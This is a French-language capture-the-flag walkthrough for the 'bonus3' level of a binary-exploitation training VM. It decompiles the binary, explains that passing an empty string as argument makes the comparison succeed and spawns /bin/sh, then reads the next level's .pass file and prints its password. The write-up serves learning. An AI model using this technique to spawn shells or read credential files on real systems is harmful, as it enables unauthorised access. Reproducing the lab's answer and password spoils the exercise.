# BONUS 3
## Walkthrough

Voici les étapes suivit pour accéder au niveau supérieur, soit le `end`.

1. Une fois connecté à la VM sur le `bonus3`, l'on retrouve un fichier `bonus3` situé à la racine du dossier utilisateur. Ce dernier s'avère être de nouveau un exécutable ELF (Executable and Linkable Format).

2. On extrait ce fichier sur la machine host soit en utilisant la commande `scp` soit en utilisant un logiciel créer à cet effet.

	```sh
	> scp -P 4242 bonus3@127.0.0.1:bonus3 /path/on/machine/host
	```

3. On ouvre ensuite ce fichier dans Ghidra et après analyse, on obtient le désassemblage ci-dessous (que l'on refactorise pour plus de clarté).

    ```sh
    int main(int argc, char** argv)
    {
    	FILE *fileBuffer;
    	char buffer_1[16];
    	char buffer_2[66];

    	fileBuffer = fopen("/home/user/end/.pass","r");
    	if ((fileBuffer == NULL) || (argc != 2))
    	{
    		return EXIT_FAILURE;
    	}
    	bzero(buffer_1, 33);
    	fread(buffer_1, 1, 66, fileBuffer);
    	fread(buffer_2, 1, 65, fileBuffer);
    	fclose(fileBuffer);
    	buffer_1[atoi(argv[1]) / 4] = 0;
    	if (strcmp(buffer_1, argv[1]) == 0) {
    		execl("/bin/sh","sh", 0);
    	} else {
    		puts(buffer_2);
    	}
    	return EXIT_SUCCESS;
    }
    ```

    À partir de ce désassemblage, on en déduit que notre programme ne comporte qu'une seule fonction : la fonction `main`.

    Plus précisément, la fonction `main` prend un argument en ligne de commande (fourni via `argv[1]`) et effectue des opérations sur les données du fichier en fonction de cet argument :
    - Tout d'abord, le programme ouvre le fichier `/home/user/end/.pass` en mode lecture (`r`) à l'aide de la fonction `fopen` et stocke le pointeur vers le fichier dans `fileBuffer`.
    - Ensuite, le programme vérifie si l'ouverture du fichier a réussi (`fileBuffer == NULL`) ou si le nombre d'arguments en ligne de commande n'est pas égal à `2` (`argc != 2`). Si l'une de ces conditions n'est pas satisfaite, le programme renvoie `EXIT_FAILURE`.
    - Dans le cas contraire, le programme utilise la fonction `fread` pour lire `66 octets` dans `buffer_1`, `65 octets` dans `buffer_2` à partir du fichier et ferme ensuite le fichier avec `fclose`.
    - Pour continuer, le programme utilise la fonction `atoi `pour convertir l'argument (`argv[1]`) en entier, divise ce nombre par `4`, puis met à zéro le caractère à cette position dans `buffer_1`.
    - Enfin, le programme compare `buffer_1` avec l'argument initial (`argv[1]`). Si la comparaison est vraie, cela signifie que la modification a réussi, et le programme exécute `/bin/sh` avec `execl` pour lancer un `shell interactif`. Sinon, il affiche le contenu de `buffer_2` avec `puts`.

    En résumé, le programme modifie dynamiquement la première chaîne de caractères lue à partir du fichier en fonction de l'argument fourni, puis compare cette chaîne modifiée avec l'argument initial. Si la comparaison réussit, le programme lance un `shell interactif` ; sinon, il affiche une partie du contenu du fichier. Ce code semble avoir des vulnérabilités potentielles liées à l'utilisation de atoi sans vérification appropriée et à la manipulation de chaînes de caractères.

4. À partir de là, on sait que pour exploiter ce programme l'on doit passer un argument spécifique pour valider la condition `strcmp(buffer_1, argv[1]) == 0` et ainsi exécuter le commande `/bin/sh` via la fonction `execl`. On sait que la fonction `atoi()` convertit une chaîne de caractères en un entier. Cependant, lorsqu'on lui passe une chaîne de caractère vide, `atoi("")` renvoie `0`, car il n'y a aucune représentation numérique de cette dernière.
En exploitant cette particularité et en passant comme argument la chaine `""`, on atteint l'instruction `buffer_1[atoi(argv[1]) / 4] = 0`. En conséquence, le premier octet de `buffer_1` est remplacé par un null byte `\0`. Puis, lors de la comparaison avec `argv[1]` dans `strcmp(buffer_1, argv[1])`, les deux chaînes sont considérées comme égales, déclenchant l'exécution du `shell interactif` grâce à `execl("/bin/sh","sh", 0)`. Ainsi, en passant une chaîne vide comme argument, on exploite cette subtilité pour obtenir un accès au `shell interactif`.

5. Il manque plus qu'à lancer le programme avec comme argument une chaine de caractère vide pour valider la conditon `(strcmp(buffer_1, argv[1]) == 0` et lancer le `shell interactif` via `execl("/bin/sh","sh", 0)`. On exécute la fonction `whoami` pour s'assurer que l'on est bien l'utilisateur `end` et non plus l'utilisateur `bonus3`. Enfin, on `cat` le fichier `/home/user/end/.pass` pour obtenir le mot de passe.

    ```sh
    > ./bonus3 ""
    > whoami
    end
    > cat /home/user/end/.pass
    3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
    ```

6. On peut à présent passer au niveau supérieur en exécutant la commande `su end` et en y spécifiant le mot de passe qui vient d'être trouvée.

    ```sh
    > su end
    Password :
    > 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
    ```

7. On constate que le niveau `end` possède lui aussi un fichier à sa racine, on `cat` ainsi sont contenu pour obtenir le message final du projet.

    ```sh
    > ls
    end
    > cat end
    Congratulations graduate!
    ```
